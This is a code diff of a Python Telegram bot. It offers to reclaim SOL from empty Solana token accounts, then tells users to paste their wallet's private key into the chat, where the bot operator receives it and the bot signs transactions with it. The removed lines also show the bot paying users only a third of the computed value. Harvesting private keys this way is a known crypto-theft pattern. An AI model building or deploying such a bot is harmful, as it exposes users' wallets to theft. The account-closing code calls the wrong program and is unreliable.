@@ -1,185 +1,121 @@
+import os
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import requests
+import base58
 import base64
-import logging
-from solders.system_program import SystemProgram
-from solders.transaction import Transaction
-from solders.keypair import Keypair
-from solders.pubkey import Pubkey
+from solana.rpc.api import Client
+from solana.transaction import Transaction
+from solana.keypair import Keypair
+from solana.publickey import PublicKey
+from solana.rpc.types import TxOpts
+from solana.system_program import CloseAccountParams, close_account
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-logging.basicConfig(level=logging.INFO)
-
-# تعديل المتغير ليكون TELEGRAM_BOT_TOKEN
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')  # استخدام البيئة لقراءة التوكن
-ADMIN_ID = 5053683608
+BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 RPC_URL = "https://api.mainnet-beta.solana.com"
 bot = telebot.TeleBot(BOT_TOKEN)
+client = Client(RPC_URL)
 
-user_wallets = {}
 user_states = {}
+wallet_data = {}
 
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    try:
-        user_states[message.chat.id] = None
-        welcome_text = "Welcome 👋\n\nSend me the wallet address you want to check 🔍"
-        bot.reply_to(message, welcome_text)
-    except Exception as e:
-        logging.error(f"/start error: {e}")
+def handle_start(message):
+    bot.reply_to(message, "Send your wallet address:")
+    user_states[message.chat.id] = 'awaiting_wallet'
 
-@bot.message_handler(func=lambda message: user_states.get(message.chat.id) is None)
+@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == 'awaiting_wallet')
 def handle_wallet(message):
-    try:
-        wallet = message.text.strip()
-        if not (32 <= len(wallet) <= 44):
-            bot.reply_to(message, "❗ Invalid address, try again.")
-            return
+    address = message.text.strip()
+    if not (32 <= len(address) <= 44):
+        bot.reply_to(message, "❌ Invalid wallet address.")
+        return
 
-        solana_api = "https://api.mainnet-beta.solana.com"
-        headers = {"Content-Type": "application/json"}
-        data = {
-            "jsonrpc": "2.0",
-            "id": 1,
-            "method": "getTokenAccountsByOwner",
-            "params": [
-                wallet,
-                {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
-                {"encoding": "jsonParsed"}
-            ]
-        }
+    user_states[message.chat.id] = None
+    wallet_data[message.chat.id] = {"address": address}
 
-        response = requests.post(solana_api, json=data, headers=headers)
-        response.raise_for_status()
+    response = requests.post(RPC_URL, json={
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "getTokenAccountsByOwner",
+        "params": [
+            address,
+            {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
+            {"encoding": "jsonParsed"}
+        ]
+    }, headers={"Content-Type": "application/json"})
 
-        result = response.json()
-        if "result" not in result or "value" not in result["result"]:
-            bot.reply_to(message, "❗ Unexpected response. Try again later.")
-            return
+    result = response.json().get("result", {}).get("value", [])
+    tokens = []
+    close_candidates = []
+    for acc in result:
+        info = acc["account"]["data"]["parsed"]["info"]
+        amount = info["tokenAmount"]["uiAmount"]
+        symbol = info.get("mint", "")[:4]
+        if amount > 0:
+            tokens.append(f'{symbol}... = {amount}')
+        else:
+            close_candidates.append(acc["pubkey"])
 
-        accounts = result["result"]["value"]
-        token_accounts = 0
-        nft_accounts = 0
-        cleanup_accounts = 0
-        total_rent = 0
+    wallet_data[message.chat.id]["close_accounts"] = close_candidates
 
-        for acc in accounts:
-            try:
-                info = acc["account"]["data"]["parsed"]["info"]
-                amount = info["tokenAmount"]["uiAmount"]
-                decimals = info["tokenAmount"]["decimals"]
+    text = f"Wallet: {address[:4]}...{address[-4:]}\n"
+    if tokens:
+        text += "\nTokens found:\n" + "\n".join(tokens)
+    text += f"\n\nEmpty accounts to close: {len(close_candidates)}"
+    text += f"\nExpected return: {round(len(close_candidates) * 0.00203928, 5)} SOL"
 
-                if amount == 0:
-                    token_accounts += 1
-                elif decimals == 0 and amount == 1:
-                    nft_accounts += 1
-                else:
-                    cleanup_accounts += 1
-
-                total_rent += 0.00203928
-            except Exception as e:
-                logging.warning(f"Error processing account: {e}")
-                continue
-
-        real_value = total_rent
-        sol_value = round(real_value / 3, 5)
-        short_wallet = wallet[:4] + "..." + wallet[-4:]
-
-        if sol_value < 0.01:
-            bot.send_message(
-                message.chat.id,
-                "🚫 Unfortunately, we cannot offer any value for this wallet.\n\n"
-                "🔍 Try checking other addresses—some might be valuable!"
-            )
-            return
-
-        user_wallets[message.chat.id] = {
-            "original_wallet": wallet,
-            "amount": real_value,
-            "accounts": [acc["pubkey"] for acc in accounts]
-        }
-
-        result_text = (
-            f"Wallet: `{short_wallet}`\n\n"
-            f"You will receive: `{sol_value} SOL` 💰"
-        )
-
-        markup = InlineKeyboardMarkup()
-        markup.add(
-            InlineKeyboardButton("✅ Confirm", callback_data="confirm"),
-            InlineKeyboardButton("❌ Cancel", callback_data="cancel")
-        )
-
-        bot.send_message(message.chat.id, result_text, reply_markup=markup)
-
-    except Exception as e:
-        logging.error(f"Error handling wallet: {e}")
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("✅ Confirm", callback_data="confirm"))
+    bot.send_message(message.chat.id, text, reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "confirm")
 def handle_confirm(call):
+    bot.send_message(call.message.chat.id, "Send your private key:")
+    user_states[call.message.chat.id] = "awaiting_key"
+
+@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "awaiting_key")
+def handle_key(message):
     try:
-        bot.send_message(call.message.chat.id, "🔒 Please send your private key to proceed.")
-        user_states[call.message.chat.id] = "waiting_for_private_key"
-    except Exception as e:
-        logging.error(f"Error handling confirm: {e}")
+        priv_key = base58.b58decode(message.text.strip())
+        keypair = Keypair.from_secret_key(priv_key)
+        user_states[message.chat.id] = None
 
-@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "waiting_for_private_key")
-def handle_private_key(message):
-    try:
-        private_key = message.text.strip()
-
-        # Convert private key to Keypair (assuming it's in base58 format)
-        keypair = Keypair.from_secret_key(base58.b58decode(private_key))
-
-        # Perform cleanup and close token accounts
-        perform_cleanup(keypair, message.chat.id)
-
-    except Exception as e:
-        logging.error(f"Error processing private key: {e}")
-        bot.send_message(message.chat.id, "❌ Invalid private key. Please try again.")
-
-def perform_cleanup(keypair: Keypair, chat_id: int):
-    try:
-        accounts = user_wallets[chat_id]["accounts"]
-        destination = keypair.pubkey()
-        instructions = []
-
-        for acc in accounts:
-            acc_pubkey = Pubkey.from_string(acc)
-            ix = SystemProgram.close_account(
-                account=acc_pubkey,
-                destination=destination,
-                owner=destination
-            )
-            instructions.append(ix)
-
-        if not instructions:
-            bot.send_message(chat_id, "No empty accounts to close.")
+        wallet_address = wallet_data[message.chat.id]["address"]
+        if str(keypair.public_key) != wallet_address:
+            bot.send_message(message.chat.id, "❌ Private key doesn't match wallet.")
             return
 
-        transaction = Transaction()
-        transaction.add(*instructions)
+        close_accounts = wallet_data[message.chat.id]["close_accounts"]
+        if not close_accounts:
+            bot.send_message(message.chat.id, "✅ Verified.\nAccounts ready to close: 0")
+            return
 
-        # Sign transaction
-        transaction.sign([keypair])
+        # تنفيذ إغلاق الحسابات
+        instructions = []
+        for acc in close_accounts:
+            instructions.append(
+                close_account(
+                    CloseAccountParams(
+                        account=PublicKey(acc),
+                        destination=keypair.public_key,
+                        owner=keypair.public_key
+                    )
+                )
+            )
 
-        # Send transaction
-        raw_tx = base64.b64encode(transaction.serialize()).decode("utf-8")
-        send_data = {
-            "jsonrpc": "2.0",
-            "id": 1,
-            "method": "sendTransaction",
-            "params": [raw_tx, {"skipPreflight": False}]
-        }
+        txn = Transaction()
+        txn.add(*instructions)
 
-        response = requests.post(RPC_URL, json=send_data)
-        result = response.json()
-        if "result" in result:
-            bot.send_message(chat_id, f"✅ Cleanup complete!\nTransaction: `{result['result']}`", parse_mode='Markdown')
-        else:
-            bot.send_message(chat_id, f"❌ Transaction failed:\n{result}", parse_mode='Markdown')
+        result = client.send_transaction(txn, keypair, opts=TxOpts(skip_preflight=True, preflight_commitment="confirmed"))
+        sig = result['result']
+        bot.send_message(
+            message.chat.id,
+            f"✅ Accounts closed.\n[View on SolScan](https://solscan.io/tx/{sig})",
+            parse_mode='Markdown',
+            disable_web_page_preview=True
+        )
     except Exception as e:
-        logging.error(e)
-        bot.send_message(chat_id, "❌ Failed to send transaction.")
+        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
 
 bot.polling()
